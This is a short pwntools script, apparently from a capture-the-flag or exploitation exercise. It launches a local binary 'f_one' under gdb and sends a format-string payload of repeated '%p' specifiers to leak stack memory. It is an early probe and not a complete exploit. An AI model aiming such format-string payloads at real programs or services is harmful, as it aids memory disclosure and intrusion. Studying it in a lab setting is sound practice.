from pwn import*

p = process("./f_one")
gdb.attach(p, api=True)
payload = b"%p "*10

p.sendline(payload)
p.interactive()